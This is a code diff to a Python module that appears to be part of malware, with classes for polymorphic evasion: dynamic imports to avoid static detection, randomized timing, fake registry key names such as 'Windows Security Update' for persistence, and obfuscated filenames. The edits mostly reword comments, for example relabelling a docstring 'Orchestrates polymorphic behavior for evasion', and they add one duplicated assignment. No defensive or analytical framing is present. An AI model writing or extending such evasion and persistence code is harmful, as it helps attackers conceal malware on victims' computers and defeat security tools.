@@ -6,7 +6,7 @@ import time
 import importlib
 import types
 
-# Dynamic Module Loading
+# Dynamic Module Loading Mechanism
 
 class DynamicLoader:
     """Dynamically loads modules to avoid static imports"""
@@ -20,7 +20,6 @@ class DynamicLoader:
             return DynamicLoader._cache[module_name]
         
         try:
-            # Try importing with importlib
             if module_name in sys.modules:
                 module = sys.modules[module_name]
             else:
@@ -49,8 +48,7 @@ class BehavioralPolymorph:
     
     @staticmethod
     def random_delay(min_ms=0, max_ms=50):
-        """Random delay to avoid consistent timing patterns"""
-        # we divide on 1000.0 because the time.sleep() function takes the delay in seconds
+        """Injects random execution delay."""
         delay = random.uniform(min_ms / 1000.0, max_ms / 1000.0)
         time.sleep(delay)
     
@@ -71,7 +69,7 @@ class BehavioralPolymorph:
         """Probabilistic action execution"""
         return random.random() < probability
 
-# Registry Name Generator
+# Registry Persistence Generators
 
 class RegistryNameGenerator:
     """Generates polymorphic registry names"""
@@ -88,8 +86,7 @@ class RegistryNameGenerator:
     
     @staticmethod
     def generate_registry_name():
-        """Generate random legitimate-sounding registry name"""
-        # Sometimes use predefined, sometimes generate
+        """Generates a deceptive registry key name."""
         if random.random() < 0.5:
             predefined = [
                 "Windows Security Update",
@@ -103,12 +100,11 @@ class RegistryNameGenerator:
             ]
             return random.choice(predefined)
         else:
-            # Generate new combination
             prefix = random.choice(RegistryNameGenerator.LEGITIMATE_PREFIXES)
             suffix = random.choice(RegistryNameGenerator.LEGITIMATE_SUFFIXES)
             return f"{prefix} {suffix}"
 
-# Filename Obfuscation
+# File Artifact Obfuscation
 
 class FilenameObfuscator:
     """Generates obfuscated filenames"""
@@ -131,7 +127,7 @@ class FilenameObfuscator:
 # Main Polymorphic Context
 
 class PolymorphicContext:
-    """Main context manager for polymorphic operations"""
+    """Orchestrates polymorphic behavior for evasion."""
     
     def __init__(self):
         self.dynamic_loader = DynamicLoader()
@@ -139,23 +135,20 @@ class PolymorphicContext:
         self.registry_generator = RegistryNameGenerator()
         self.filename_obfuscator = FilenameObfuscator()
         
-        # Runtime configuration
+        self.filename_obfuscator = FilenameObfuscator()
+        
         self.buffer_size = self.behavioral.variable_buffer_size()
     
     def add_random_delay(self, min_ms=0, max_ms=100):
-        """Add random delay with optional custom bounds"""
         self.behavioral.random_delay(min_ms, max_ms)
     
     def get_registry_name(self):
-        """Get polymorphic registry name"""
         return self.registry_generator.generate_registry_name()
     
     def get_log_filename(self):
-        """Get polymorphic log filename"""
         return self.filename_obfuscator.generate_log_filename()
     
     def mutate_config(self):
-        """Randomly mutate configuration"""
         self.buffer_size = self.behavioral.variable_buffer_size()
 
 
